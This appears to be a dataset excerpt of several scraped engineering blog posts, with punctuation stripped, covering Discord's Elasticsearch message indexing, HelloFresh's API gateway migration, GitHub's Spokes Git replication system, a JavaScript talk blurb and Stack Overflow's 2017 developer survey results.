22,engineering,How Discord Indexes Billions of Messages   Discord BlogIndexing   Mapping the Data  At a really high level  in Elasticsearch  we have the concept of an  index   containing a number of  shards  within it  A shard in this case is actually a Lucene index  Elasticsearch is responsible for distributing the data within an index to a shard belonging to that index  If you want  you can control how the data is distributed amongst the shards by using a  routing key   An index can also contain a  replication factor   which is how many nodes an index  and its shards within  should be replicated to  If the node that the index is on fails a replica can take over  Unrelated but related  these replicas can also serve search queries  so you can scale the search throughput of the index by adding more replicas    Since we handed all of the sharding logic in the application level  our Shards   having Elasticsearch do the sharding for us didn t really make sense  However  we could use it to do replication and balancing of the indices between nodes in the cluster  In order to have Elasticsearch automatically create an index using the correct configuration  we used an index template  which contained the index configuration and data mapping  The index configuration was pretty simple   The index should only contain one shard  don t do any sharding for us   The index should be replicated to one node  be able to tolerate the failure of the primary node the index is on   The index should only refresh once every 60 minutes  why we had to do this is explained below    The index contains a single document type  message  Storing the raw message data in Elasticsearch made little sense as the data was not in a format that was easily searchable  Instead  we decided to take each message  and transform it into a bunch of fields containing metadata about the message that we can index and search on   You ll notice that we didn t include timestamp in these fields  and if you recall from our previous blog post  our IDs are Snowflakes  which means they inherently contain a timestamp  which we can use to power before  on  and after queries by using a minimum and maximum ID range    These fields however aren t actually  stored  in Elasticsearch  rather  they are only stored in the inverted index  The only fields that are actually stored and returned are the message  channel and server ID that the message was posted in  This means that message data is not duplicated in Elasticsearch  The tradeoff being that we ll have to fetch the message from Cassandra when returning search results  which is perfectly okay  because we d have to pull the message context  2 messages before   after  from Cassandra to power the UI anyway  Keeping the actual message object out of Elasticsearch means that we don t have to pay for additional disk space to store it  However  this means we can t use Elasticsearch to highlight matches in search results  We d have to build the tokenizers and language analyzers into our client to do the highlighting  which was really easy to do  
23,engineering,Scaling   HelloFresh  API GatewayMonday  February 20  2017 at 8 56AM  HelloFresh keeps growing every single day  our product is always improving  new ideas are popping up from everywhere  our supply chain is being completely automated  All of this is simply amazing us  but of course this constant growth brings many technical challenges   Today I d like to take you on a small journey that we went through to accomplish a big migration in our infrastructure that would allow us to move forward in a faster  more dynamic  and more secure way   The Challenge  We ve recently built an API Gateway  and now we had the complex challenge of moving our main  monolithic  API behind it   ideally without downtime  This would enable us to create more microservices and easily hook them into our infrastructure without much effort   The Architecture  Our gateway is on the frontline of our infrastructure  It receives thousands of request per day  and for that reason we chose Go when building it  because of its performance  simplicity  and elegant solution to concurrency   We already had many things in place that made this transition more simple  some of them are   Service Discovery and Client Side Load Balancing  We use consul as our service discovery tool  This together with HAProxy  enables us to solve two of the main problems when moving to a microservice architecture  service discovery  automatically registering new services as they come online  and client side load balancing  distributing requests across servers    Automation  Maybe the most useful tool in our arsenal was the automation of our infrastructure  We use Ansible to provision anything in our cloud   this goes from a single machine to dealing with network  DNS  CI machines  and so on  Importantly  we ve implemented a convention  when creating a new service  the first thing our engineers tackle is to create the Ansible scripts for this service   Logging and Monitoring  I like to say that anything that goes in our infrastructure should be monitored somehow  We have some best practices in place on how to properly log and monitor your application   Dashboards around the office show how the system is performing at any given time   For logging we use the ELK Stack  which allows us to quickly analyze detailed data about a service s behavior   For monitoring we love the combination of statsd   grafana  It is simply amazing what you can accomplish with this tool   Grafana dashboards give amazing insight into your performance metrics  Understanding the current architecture  Even with all these tools in place we still have a hard problem to solve  understand the current architecture and how we can pull off a smooth migration  At this stage  we invested some time on refactoring our legacy applications to support our new gateway and authentication service that would be also introduced in this migration  watch this space for another article on that   Ed    Some of the problems we found   While we can change our mobile apps  we have to assume people won t update straight away  So we had to keep backwards compatibility   for example in our DNS   to ensure older versions didn t stop working   We had to analyze all routes available in our public and private APIs and register them in the gateway in an automated way   We had to disable authentication from our main API and forward this responsibility to the auth service   Ensuring the security of the communication between the gateway and the microservices   To solve the import problems we wrote a script  in Go  again  to read our OpenAPI specification  aka Swagger  and create a proxy with the correct rules  like rate limiting  quotas  CORS  etc  for each resource of our APIs   To test the communication between the services we simply set up our whole infrastructure in a staging environment and started running our automated tests  I must say that this was the most helpful thing that we had during our migration process  We have a large suite of automated functional tests that helped us maintaining the same contract that the main API was returning to our mobile and web apps   After we were quite sure that our setup worked on our staging environment we started to think about on how to move this to production   The first attempt  Spoiler alert  our first attempt at going live was pretty much a disaster  Even though we had a quite nice plan in place we were definitely not ready to go live at that point  Let s check the step by step of our initial plan   Deploy latest version of the API gateway to staging  Deploy the main API with changes to staging  Run the automated functional tests against staging  Run manual QA tests on staging website and mobile apps  Deploy latest version of the API gateway to live  Deploy the main API with changes to live  Run the automated functional tests against live  Run manual QA tests on live website and mobile apps  Beer  Everything went quite well on staging  at least according to our tests   but when we decided to go live we started to have some problems   Overload on the auth database  we underestimated the amount of requests we d receive  causing our database to refuse connections Wrong CORS configuration  for some endpoints we configured the CORS rules incorrectly  causing requests from the browser to fail  Thanks to our database being flooded with requests we had to roll back right away  Luckily  our monitoring was able to catch that the problem occurred when requesting new tokens from the auth service   The second attempt  We knew that we didn t prepare well for our first deploy  so the first thing we did right after rolling back was hold a post mortem  Here s some of the things we improved before trying again   Prepare a blue green deployment procedure  We created a replica of our live environment with the gateway deployed already  so all we needed to when the time came was make one configuration change to bring this cluster online  We could rollback if necessary with the same simple change   Gather more metrics from the current applications to help us have the correct machine sizes to handle the load  We used the data from the first attempt as a yardstick for the amount of traffic we expected  and ran load tests with Gatling to ensure we could comfortably accommodate that traffic   Fix known issues with our auth service before going live  These included a problem with case sensitivity  a performance issue when signing a JWT  and  as always  adding more logging and monitoring   It took us around a week to finish all those tasks  and when we were finished  our deployment went smoothly with no downtime  Even with the successful deployment we found some corner case problems that we didn t cover on the automated tests  but we were able to fix them without a big impact on our applications   The results  In the end  our architecture looked like this   API Gateway Architecture  Main API  10  main API servers on High CPU Large machines  MySQL instances run in a master replica setup  3 replicas   Auth service  4 application servers  PostgreSQL instances run in a master replica setup  2 replicas   A RabbitMQ cluster is used to asynchronously handle user updates  API Gateway  4 application servers  MongoDB instances run in a master replica setup  4 replicas   Miscellaneous  Ansible is used to execute commands in parallel on all machines  A deploy takes only seconds  Amazon CloudFront as the CDN WAF  Consul   HAProxy as service discovery and client side load balancing  Statsd   Grafana to graph metrics across the system and alert on problems  ELK Stack for centralizing logs across different services  Concourse CI as our Continuous Integration tool  I hope you ve enjoyed our little journey  stay tuned for our next article 
24,engineering,Building resilience in SpokesSpokes is the replication system for the file servers where we store over 38 million Git repositories and over 36 million gists  It keeps at least three copies of every repository and every gist so that we can provide durable  highly available access to content even when servers and networks fail  Spokes uses a combination of Git and rsync to replicate  repair  and rebalance repositories   What is Spokes   Before we get into the topic at hand building resilience we have a new name to announce  DGit is now Spokes   Earlier this year  we announced  DGit  or  Distributed Git   our application level replication system for Git  We got feedback that the name  DGit  wasn t very distinct and could cause confusion with the Git project itself  So we have decided to rename the system Spokes   Defining resilience  In any system or service  there are two key ways to measure resilience  availability and durability  A system s availability is the fraction of the time it can provide the service it was designed to provide  Can it serve content  Can it accept writes  Availability can be partial  complete  or degraded  is every repository available  Are some repositories or whole servers slow   A system s durability is its resistance to permanent data loss  Once the system has accepted a write a push  a merge  an edit through the website  new repository creation  etc  it should never corrupt or revert that content  The key here is the moment that the system accepts the write  how many copies are stored  and where  Enough copies must be stored for us to believe with some very high probability that the write will not be lost   A system can be durable but not available  For example  if a system can t make the minimum required number of copies of an incoming write  it might refuse to accept writes  Such a system would be temporarily unavailable for writing  while maintaining the promise not to lose data  Of course  it is also possible for a system to be available without being durable  for example  by accepting writes whether or not they can be committed safely   Readers may recognize this as related to the CAP Theorem  In short  a system can satisfy at most two of these three properties   consistency  all nodes see the same data  availability  the system can satisfy read and write requests  partition tolerance  the system works even when nodes are down or unable to communicate  Spokes puts the highest priority on consistency and partition tolerance  In worst case failure scenarios  it will refuse to accept writes that it cannot commit  synchronously  to at least two replicas   Availability  Spokes s availability is a function of the availability of underlying servers and networks  and of our ability to detect and route around server and network problems   Individual servers become unavailable pretty frequently  Since rolling out Spokes this past spring  we have had individual servers crash due to a kernel deadlock and faulty RAM chips  Sometimes servers provide degraded service due to lesser hardware faults or high system load  In all cases  Spokes must detect the problem quickly and route around it  Each repository is replicated on three servers  so there s almost always an up to date  available replica to route to even if one server is offline  Spokes is more than the sum of its individually failure prone parts   Detecting problems quickly is the first step  Spokes uses a combination of heartbeats and real application traffic to determine when a file server is down  Using real application traffic is key for two reasons  First  heartbeats learn and react slowly  Each of our file servers handles a hundred or more incoming requests per second  A heartbeat that happens once per second would learn about a failure only after a hundred requests had already failed  Second  heartbeats test only a subset of the server s functionality  for example  whether or not the server can accept a TCP connection and respond to a no op request  But what if the failure mode is more subtle  What if the Git binary is corrupt  What if disk accesses have stalled  What if all authenticated operations are failing  No ops can often succeed when real traffic will fail   So Spokes watches for failures during the processing of real application traffic  and it marks a node as offline if too many requests fail  Of course  real requests do fail sometimes  Someone can try to read a branch that has already been deleted  or try to push to a branch they don t have access to  for example  So Spokes only marks the node offline if three requests fail in a row  That sometimes marks perfectly healthy nodes offline three requests can fail in a row just by random chance but not often  and the penalty for it is not large   Spokes uses heartbeats  too  but not as the primary failure detection mechanism  Instead  heartbeats have two purposes  polling system load and providing the all clear signal after a node has been marked as offline  As soon as a heartbeat succeeds  the node is marked as online again  If the heartbeat succeeds despite ongoing server problems  retrieving system load is almost a no op   the node will get marked offline again after three more failed requests   So Spokes detects that a node is down within about three failed operations  That s still three failed operations too many  For clean failures connections refused or timeouts all operations know how to try the next host  Remember  Spokes has three or more copies of every repository  A routing query for a repository returns not one server  but a list of three  or so  up to date replicas  sorted in preference order  If an operation attempted on the first choice replica fails  there are usually two other replicas to try   A graph of operations  here  remote procedure calls  or RPCs  failed over from one server to another clearly shows when a server is offline  In this graph  a single server is unavailable for about 1 5 hours  during this time  many thousands of RPC operations are redirected to other servers  This graph is the single best detector the Spokes team has for discovering misbehaving servers   Spokes s node offline detection is only advisory i e   only an optimization  A node that has had three failures in a row just gets moved to the end of the preference order for all read operations  rather than removed from the list of replicas  It s better for Spokes to try a probably offline replica last  than to not try it at all   This failure detector works well for server failures  when a server is overloaded or offline  operations to it will fail  Spokes detects those failures and temporarily stops directing traffic to the failed server until a heartbeat succeeds  However  failures of networks and application  Rails  servers are much messier  A given file server can appear to be offline to just a subset of the application servers  or one bad application server can spuriously determine that every file server is offline  So Spokes s failure detection is actually MxN  each application server keeps its own list of which file servers are offline  or not  If we see many application servers marking a single file server as offline  then it probably is  If we see a single application server marking many file servers offline  then we ve learned about a fault on that application server  instead   The figure below illustrates the MxN nature of failure detection and shows in red which failure detectors are true if a single file server  dfs4   is offline   In one recent incident  a single front end application server in a staging environment lost its ability to resolve the DNS names of the file servers  Because it couldn t reach the file servers to send them RPC operations or heartbeats  it concluded that every file server was offline  But that incorrect determination was limited to that one application server  all other application servers worked normally  So the flaky application server was immediately obvious in the RPC failover graphs  and no production traffic was affected   Durability  Sometimes  servers fail  Disks can fail  RAID controllers can fail  even entire servers or entire racks can fail  Spokes provides durability for repository data even in the face of such adversity   The basic building block of durability  like availability  is replication  Spokes keeps at least three copies of every repository  wiki  and gist  and those copies are in different racks  No updates to a repository pushes  renames  edits to a wiki  etc  are accepted unless a strict majority of the replicas can apply the change and get the same result   Spokes needs just one extra copy to survive a single node failure  So why a majority  It s possible  even common  for a repository to get multiple writes at roughly the same time  Those writes might conflict  one user might delete a branch while another user pushes new commits to that same branch  for example  Conflicting writes must be serialized that is  they have to be applied  or rejected  in the same order on every replica  so every replica gets the same result  The way Spokes serializes writes is by ensuring that every write acquires an exclusive lock on a majority of replicas  It s impossible for two writes to acquire a majority at the same time  so Spokes eliminates conflicts by eliminating concurrent writes entirely   If a repository exists on exactly three replicas  then a successful write on two replicas constitutes both a durable set  and a majority  If a repository has four or five replicas  then three are required for a majority   In contrast  many other replication and consensus protocols have a single primary copy at any moment  The order that writes arrive at the primary copy is the official order  and all other replicas must apply writes in that order  The primary is generally designated manually  or automatically using an election protocol  Spokes simply skips that step and treats every write as an election selecting a winning order and outcome directly  rather than a winning server that dictates the write order   Any write in Spokes that can t be applied identically at a majority of replicas gets reverted from any replica where it was applied  In essence  every write operation goes through a voting protocol  and any replicas on the losing side of the vote are marked as unhealthy unavailable for reads or writes until they can be repaired  Repairs are automatic and quick  Because a majority agreed either to accept or to roll back the update  there are still at least two replicas available to continue accepting both reads and writes while the unhealthy replica is repaired   To be clear  disagreements and repairs are exceptional cases  GitHub accepts many millions of repository writes each day  On a typical day  a few dozen writes will result in non unanimous votes  generally because one replica was particularly busy  the connection to it timed out  and the other replicas voted to move on without it  The lagging replica almost always recovers within a minute or two  and there is no user visible impact on the repository s availability   Rarer still are whole disk and whole server failures  but they do happen  When we have to remove an entire server  there are suddenly hundreds of thousands of repositories with only two copies  instead of three  This  too  is a repairable condition  Spokes checks periodically to see if every repository has the desired number of replicas  if not  more replicas are created  New replicas can be created anywhere  and they can be copied from wherever the surviving two copies of each repository are  Hence  repairs after a server failure are N to N  The larger the file server cluster  the faster it can recover from a single node failure   Clean shutdowns  As described above  Spokes can deal quickly and transparently with a server going offline or even failing permanently  So  can we use that for planned maintenance  when we need to reboot or retire a server  Yes and no   Strictly speaking  we can reboot a server with sudo reboot   and we can retire it just by unplugging it  But there are subtle disadvantages to doing so  so we have more careful mechanisms  reusing a lot of the same logic that would respond to a crash or a failure   Simply rebooting a server does not affect future read and write operations  which will be transparently directed to other replicas  It doesn t affect in progress write operations  either  as those are happening on all replicas  and the other two replicas can easily vote to proceed without the server we re rebooting  But a reboot does break in progress read operations  Most of those reads e g   fetching a README to display on a repository s home page are quick and will complete while the server shuts down gracefully  But some reads  particularly clones of large repositories  take minutes or hours to complete  depending on the speed of the end user s network  Breaking these is  well  rude  They can be restarted on another replica  but all progress up to that point would be lost   Hence  rebooting a server intentionally in Spokes begins with a quiescing period  While a server is quiescing  it is marked as offline for the purposes of new read operations  but existing read operations  including clones  are allowed to finish  Quiescing can take anywhere from a few seconds to many hours  depending on which read operations are active on the server that is getting rebooted   Perhaps surprisingly  write operations are sent to servers as usual  even while they quiesce  That s because write operations run on all replicas  so one replica can drop out at any time without user visible impact  Also  that replica would fall arbitrarily far behind if it didn t receive writes while quiescing  creating a lot of catch up load when it is finally brought fully back online   We don t perform  chaos monkey  testing on the Spokes file servers  for the same reasons we prefer to quiesce them before rebooting them  to avoid interrupting long running reads  That is  we do not reboot them randomly just to confirm that sudden  single node failures are still  mostly  harmless   Instead of  chaos monkey  testing  we perform rolling reboots as needed  which accomplish roughly the same testing goals  When we need to make some change that requires a reboot e g   changing kernel or filesystem parameters  or changing BIOS settings we quiesce and reboot each server  Racks serve as availability zones 1   so we quiesce entire racks at a time  As servers in a given rack finish quiescing i e   complete all outstanding read operations we reboot up to five of them at a time  When a whole rack is finished  we move on to the next rack   Below is a graph showing RPC operations failed over during a rolling reboot  Each server gets a different color  Values are stacked  so the tallest spike shows a moment where eight servers were rebooting at once  The large block of light red shows where one server did not reboot cleanly and was offline for over two hours   Retiring a server by simply unplugging it has the same disadvantages as unplanned reboots  and more  In addition to disrupting any in progress read operations  it creates several hours of additional risk for all the repositories that used to be hosted on the server  When a server disappears suddenly  all of the repositories formerly on it are now down to two copies  Two copies are enough to perform any read or write operation  but two copies aren t enough to tolerate an additional failure  In other words  removing a server without warning increases the probability of rejecting write operations later that same day  We re in the business of keeping that probability to a minimum   So instead  we prepare a server for retirement by removing it from the count of active replicas for any repository  Spokes can still use that server for both read and write operations  But when it asks if all repositories have enough replicas  suddenly some of them the ones on the retiring server will say no  and more replicas will be created  These repairs proceed exactly as if the server had just disappeared  except that now the server remains available in case some other server fails   Conclusions  Availability is important  and durability is more important still  Availability is a measure of what fraction of the time a service responds to requests  Durability is a measure of what fraction of committed data a service can faithfully store   Spokes keeps at least three replicas of every repository  to provide both availability and durability  Three replicas means that one server can fail with no user visible effect  If two servers fail  Spokes can provide full access for most repositories and read only access to repositories that had two of their replicas on the two failing servers   Spokes does not accept writes to a repository unless a majority of replicas and always at least two can commit the write and produce the same resulting repository state  That requirement provides consistency by ensuring the same write ordering on all replicas  It also provides durability in the face of single server failures by storing every committed write in at least two places   Spokes has a failure detector  based on monitoring live application traffic  that determines when a server is offline and routes around the problem  Finally  Spokes has automated repairs for recovering quickly when a disk or server fails permanently 
25,engineering,The State of Javascript   Jack FranklinPublished on Aug 11  2016  Jack Franklin  04 08 16     Jack Franklin treats us to his talk on  The State of JavaScript   where he explores  discusses and criticises the current state of web development with JavaScript       https   frontendne co uk talks the st   
26,engineering,Stack Overflow Developer Survey 2017Who codes  More people in more places than ever before   Each month  about 40 million people visit Stack Overflow to learn  share  and level up  We estimate that 16 8 million of these people are professional developers and university level students   Our estimate on professional developers comes from the things people read and do when they visit Stack Overflow  We collect data on user activity to help surface jobs we think you might find interesting and questions we think you can answer  You can download and clear this data at any time   Web developer 72 6  Desktop applications developer 28 9  Mobile developer 23 0  Database administrator 14 4  Developer with a statistics or mathematics background 11 3  Systems administrator 11 3  DevOps specialist 11 1  Embedded applications devices developer 9 3  Data scientist 8 4  Other 7 5  Graphics programming 4 8  Graphic designer 3 9  Machine learning specialist 3 8  Quality assurance engineer 3 5   36 125 responses  select all that apply  About three quarters of respondents identify as web developers  although many also said they are working to build desktop apps and mobile apps   Full stack Web developer 63 7  Back end Web developer 24 4  Front end Web developer 11 9  10 696 responses  select all that apply Android 64 8  iOS 57 6  Windows Phone 4 3  Blackberry 0 7  1 558 responses  select all that apply Analyst or consultant 38 8  Other 31 9  Data scientist 22 5  Educator or academic 15 0  Designer or illustrator 12 3  Product manager 7 5  C suite executive 5 3  Marketing or sales manager 3 1  Elected official 0 7  4 890 responses  select all that apply  Compared to the rest of the world  the United States has a higher proportion of people who identify as full stack web developers  whereas Germany has a comparatively lower proportion  As for mobile developers  the U S  and United Kingdom have proportionally more iOS developers and fewer Android developers than the rest of the world   People other than full time developers also write code as part of their jobs  and they come to Stack Overflow for help and community  This year  we gave additional occupation options to respondents who are not full time developers  but who occasionally code as part of their work  These roles include analyst  data scientist  and educator   Less than a year 2 9  1 to 2 years 5 4  2 to 3 years 6 4  3 to 4 years 7 2  4 to 5 years 7 6  5 to 6 years 7 0  6 to 7 years 5 6  7 to 8 years 4 8  8 to 9 years 3 7  9 to 10 years 6 3  10 to 11 years 4 3  11 to 12 years 2 7  12 to 13 years 2 6  13 to 14 years 2 1  14 to 15 years 3 9  15 to 16 years 3 3  16 to 17 years 2 0  17 to 18 years 1 7  18 to 19 years 1 3  19 to 20 years 2 0  20 or more years 17 2   51 145 responses  A common misconception about developers is that they ve all been programming since childhood  In fact  we see a wide range of experience levels  Among professional developers  one eighth  12 5   learned to code less than four years ago  and an additional one eighth  13 3   learned to code between four and six years ago  Due to the pervasiveness of online courses and coding bootcamps  adults with little to no programming experience can now more easily transition to a career as a developer   Less than a year 7 4  1 to 2 years 12 9  2 to 3 years 11 7  3 to 4 years 9 8  4 to 5 years 8 3  5 to 6 years 7 3  6 to 7 years 4 7  7 to 8 years 4 0  8 to 9 years 3 1  9 to 10 years 4 8  10 to 11 years 4 1  11 to 12 years 2 0  12 to 13 years 1 8  13 to 14 years 1 3  14 to 15 years 2 1  15 to 16 years 2 1  16 to 17 years 1 7  17 to 18 years 1 3  18 to 19 years 1 0  19 to 20 years 1 0  20 or more years 7 5   40 890 responses  Web and mobile developers have significantly less professional coding experience  on average  than developers in other technical disciplines such as systems administration and embedded programming  Across all developer kinds  the software industry acts as the primary incubator for new talent  but sees a relatively low proportion of more experienced developers  For example  60  of mobile developers at software firms have fewer than five years of professional coding experience  compared to 45  of mobile developers in other industries   Among professional developers  11 3  got their first coding jobs within a year of first learning how to program  A further 36 9  learned to program between one and four years before beginning their careers as developers  Globally  developers in Southern Asia had the lowest average amount of prior coding experience when beginning their careers  those in continental Europe had the highest   Less than a year 2 9  1 to 2 years 5 4  2 to 3 years 6 4  3 to 4 years 7 2  4 to 5 years 7 6  5 to 6 years 7 0  6 to 7 years 5 6  7 to 8 years 4 8  8 to 9 years 3 7  9 to 10 years 6 3  10 to 11 years 4 3  11 to 12 years 2 7  12 to 13 years 2 6  13 to 14 years 2 1  14 to 15 years 3 9  15 to 16 years 3 3  16 to 17 years 2 0  17 to 18 years 1 7  18 to 19 years 1 3  19 to 20 years 2 0  20 or more years 17 2   51 145 responses  among respondents who indicated they no longer program as part of their job  Respondents who indicated that they had worked as professional developers in the past  but now did something else for a living  were asked how long they had coded as part of their jobs   Male 88 6  Female 7 6  Other 1 2  Gender non conforming 0 9  Transgender 0 5   35 990 responses  We asked respondents for their gender identity  Specifically  we asked them to select each of the following options that apply to them   Male  Female  Transgender  Non binary  genderqueer  or gender non conforming  A different identity  write in option   According to Quantcast  women account for 10  of Stack Overflow s U S  traffic  Similarly  10  of survey respondents from the U S  identify as women  In our survey last year  6 6  of respondents from the U S  identified as women   Meanwhile  women account for 9  of Stack Overflow s UK traffic  while 7 3  of survey respondents from the UK were women  Finally  women account for 8  of Stack Overflow s traffic from both France and Germany  while 5 1  and 5 6  of respondents from those countries  respectively  identify as women   We will publish additional analysis related to respondents  gender identities in the coming weeks   White or of European descent 74 4  South Asian 8 8  Hispanic or Latino Latina 5 6  East Asian 4 9  Middle Eastern 3 6  I prefer not to say 2 6  Black or of African descent 2 5  I don t know 2 0  Native American  Pacific Islander  or Indigenous Australian 0 9   33 033 responses  This was the first year we asked respondents for their ethnic identity  We asked them to select each option that applied   We asked respondents this question to add an important dimension to what we can learn about developers  In addition  public policy researchers and employers frequently look to us for information on how they can reach out to and better understand underrepresented groups among developers   We will publish additional analysis related to respondents  ethnic identities in the coming weeks   None or prefer not to say 96 3  Other 1 8  Blind 1 0  Deaf 0 5  Unable to walk 0 2  Unable to type 0 1   1 755 responses identified as having a disability  Similar to our question about ethnicity  this was the first year we asked respondents for their disability status  Of the 3 4  of respondents who identified as having a disability  we asked them to select each option that applied  and we included a write in option  We know developers can experience many forms of disability  For this survey  we confined our list of standard options on this question to disabilities that require some physical accommodation by employers   We will publish additional analysis related to respondents  disability status in the coming weeks   A bachelor s degree 29 1  A master s degree 21 6  High school 16 8  Some college university study  no bachelor s degree 13 7  A doctoral degree 5 9  A professional degree 4 4  Primary elementary school 3 9  I don t know not sure 2 1  I prefer not to answer 1 8  No education 0 6   34 938 responses  We asked respondents   What is the highest level of education received by either of your parents   Similar to ethnicity and disability status  this is the first year we asked this question  We asked this question in part because public policy researchers and some employers seek information about first generation college students to improve their efforts to support them   We will publish additional analysis on this in the coming weeks   The dashed line shows the average ratio of men s to women s participation  While the sample as a whole skewed heavily male  women were more likely to be represented in some developer roles than others  They were proportionally more represented among data scientists  mobile and web developers  quality assurance engineers  and graphic designers  The dashed line shows the average ratio for all of these developer roles   Web developer 72 4  Desktop applications developer 30 8  Mobile developer 20 1  Database administrator 14 5  DevOps specialist 12 4  Systems administrator 12 4  Developer with a statistics or mathematics background 11 5  Embedded applications devices developer 9 7  Other 8 7  Data scientist 7 8  Graphics programming 4 9  Quality assurance engineer 3 5  Machine learning specialist 3 5  Graphic designer 3 3  18 770 responses Web developer 73 6  Mobile developer 27 8  Desktop applications developer 22 4  Developer with a statistics or mathematics background 11 7  Database administrator 11 3  DevOps specialist 8 5  Data scientist 7 4  Embedded applications devices developer 7 2  Systems administrator 7 0  Other 6 6  Graphic designer 3 8  Machine learning specialist 3 8  Quality assurance engineer 3 1  Graphics programming 2 8  2 009 responses Web developer 80 9  Desktop applications developer 29 0  Mobile developer 27 8  Database administrator 17 0  Systems administrator 14 8  DevOps specialist 11 5  Developer with a statistics or mathematics background 10 2  Data scientist 9 6  Embedded applications devices developer 8 2  Other 6 2  Graphics programming 4 7  Machine learning specialist 4 4  Graphic designer 4 2  Quality assurance engineer 4 0  1 412 responses Web developer 74 2  Mobile developer 27 7  Desktop applications developer 25 0  Database administrator 12 9  Developer with a statistics or mathematics background 11 4  DevOps specialist 10 9  Systems administrator 10 4  Data scientist 8 8  Embedded applications devices developer 7 7  Other 5 4  Machine learning specialist 4 8  Graphics programming 4 5  Graphic designer 3 9  Quality assurance engineer 3 8  1 063 responses  Respondents who identified as White or of European descent were less likely to report being a mobile developer than those who identified as South Asian  Hispanic or Latino Latina  or East Asian  A higher proportion of respondents who identified as Hispanic or Latino Latina selected  web developer  as an option compared to those who selected White or of European descent  South Asian  or East Asian   Important note  We didn t receive enough responses from developers of some ethnicities to include them here with reliable percentages  However  we do see that many developers who identify as Black or of African descent work as web developers and mobile developers  and many developers with Middle Eastern ethnic backgrounds work as web developers and desktop applications developers  Developers who identified as Native American  Pacific Islander  or Indigenous Australian work as web developers at a high rate   Less than a year 10 7   6 0  1 to 2 years 16 6   11 3  2 to 3 years 14 0   10 8  3 to 4 years 9 7   9 5  4 to 5 years 8 6   8 1  5 to 6 years 6 6   7 5  6 to 7 years 4 7   4 8  7 to 8 years 3 6   4 4  8 to 9 years 2 2   3 4  9 to 10 years 3 7   5 0  10 to 11 years 3 9   4 3  11 to 12 years 1 6   2 3  12 to 13 years 1 4   2 0  13 to 14 years 0 6   1 5  14 to 15 years 1 2   2 2  15 to 16 years 1 5   2 4  16 to 17 years 1 2   2 0  17 to 18 years 1 2   1 6  18 to 19 years 1 1   1 1  19 to 20 years 0 6   1 2  20 or more years 5 4   8 7  Female Male 29 255 responses White or of European descent 12 5 Native American  Pacific Islander  or Indigenous Australian 12 1 I prefer not to say 11 5 Hispanic or Latino Latina 10 6 Middle Eastern 9 6 East Asian 9 2 Black or of African descent 8 8 I don t know 8 3 South Asian 8 0 Mean of 33 004 responses  Between respondents who identified as men or women  nearly twice the number of women said they had been coding for less than a year  On average  respondents who identified as White or of European descent and those who identified as Pacific Islander or Indigenous Australian had the highest average number of years experience coding   icons  1  Education  I never completed any formal education 0 8  Primary elementary school 2 0  Secondary school 11 5  Some college university study without earning a bachelor s degree 15 8  Bachelor s degree 42 0  Master s degree 21 7  Professional degree 1 4  Doctoral degree 2 5  I prefer not to answer 2 2   51 392 responses  Among current professional developers globally  76 5  of respondents said they had a bachelor s degree or higher  such as a Master s degree or equivalent   Computer science or software engineering 50 0  Computer engineering or electrical electronics engineering 10 2  Computer programming or Web development 9 1  Information technology  networking  or system administration 5 0  A natural science 4 4  A non computer focused engineering discipline 4 2  Mathematics or statistics 3 8  Something else 2 5  A humanities discipline 2 1  A business discipline 2 1  Management information systems 1 5  Fine arts or performing arts 1 5  A social science 1 5  I never declared a major 1 4  Psychology 0 5  A health science 0 3   42 841 responses  select all that apply  More than half  54 2   of professional developers who had studied at a college or university said they had concentrated their studies on computer science or software engineering  and an additional quarter  24 9   majored in a closely related discipline such as computer programming  computer engineering  or information technology  The remaining 20 9  said they had majored in other fields such as business  the social sciences  natural sciences  non computer engineering  or the arts   Among current students who responded to the survey  48 3  said they were majoring in computer science or software engineering  and 30 5  said they were majoring in closely related fields  Finally  21 2  said they were focusing on other fields   Very important 15 9  Important 25 1  Somewhat important 26 9  Not very important 20 5  Not at all important 11 5   23 355 responses  Of current professional developers  32  said their formal education was not very important or not important at all to their career success  This is not entirely surprising given that 90  of developers overall consider themselves at least somewhat self taught  a formal degree is only one aspect of their education  and so much of their practical day to day work depends on their company s individual tech stack decisions   However  computer science majors and computer engineering majors were the most likely  49 4   to say their formal education was important or very important   Compared to computer science majors  respondents who majored in less theoretical computer related disciplines  such as IT  web development  or computer programming  were more likely to say their formal educations were unimportant   Self taught 90 0  Online course 45 4  On the job training 41 2  Open source contributions 37 0  Hackathon 23 6  Coding competition 22 0  Part time evening course 15 3  Industry certification 14 7  Bootcamp 9 0   30 354 responses  select all that apply  Developers love to learn  90  say they are at least partially self taught  Among current professional developers  55 9  say they ve taken an online course  and 53 4  say they ve received on the job training   Official documentation 80 2  Stack Overflow Q A 80 1  Trade book 53 8  Non Stack online communities 50 7  Built in help 47 1  Stack Overflow Docs 27 5  Textbook 20 8  Friends network 20 7  Company internal community 18 5  Other 11 7  Tutoring mentoring 4 4   26 735 responses  select all that apply  By far  reading official documentation and using Stack Overflow Q A are the two most common ways developers level up their skills   I already had a job as a developer when I started the program 45 8  I got a job as a developer before completing the program 9 7  Immediately upon graduating 11 3  Less than a month 6 0  One to three months 8 8  Four to six months 4 0  Six months to a year 3 0  Longer than a year 3 3  I haven t gotten a job as a developer yet 8 1   2 602 responses  Due to the high demand for professional developers  coding bootcamps have exploded in popularity in the past few years  Although commonly perceived as a way for non developers to transition into a new career  we found that 45 8  of those who said they d gone through a bootcamp were already developers when they started the program  This is likely because many developers decide at various parts in their career that they need to upgrade their skills or learn new technologies to stay relevant in the job market   Yes  I program as a hobby 48 3  Yes  I contribute to open source projects 5 9  Yes  both 26 8  No 19 0   51 392 responses  Coding isn t just a career  it can be a passion  Among all developers  75 0  code as a hobby  even among professional developers a similar proportion  73 9   do so  Additionally  32 7  of developers said they contribute to open source projects   Take online courses 64 7  Buy books and work through the exercises 49 9  Part time evening courses 31 9  Contribute to open source 31 5  Bootcamp 22 4  Conferences meet ups 22 3  Return to college 21 3  Participate in online coding competitions 15 3  Get a job as a QA tester 14 3  Participate in hackathons 11 7  Master s degree 11 2  Other 10 0  None of these 2 6   23 568 responses  select all that apply  Want to learn to code but don t know where to start  More developers say you should take an online course than any other method  followed by getting a book and working through the exercises   As an important side note  we received great feedback on how we phrased this question  specifically the option   Get a job as a QA tester and work your way into a developer role   Although some developers start their careers as QA testers  the phrasing made it sound as if we saw QA as just a stepping stone  rather than a vital function and career option  QA professionals are our heroes  and QA engineers are 3 5  of our respondents this year    and we apologize for not more carefully crafting our language 
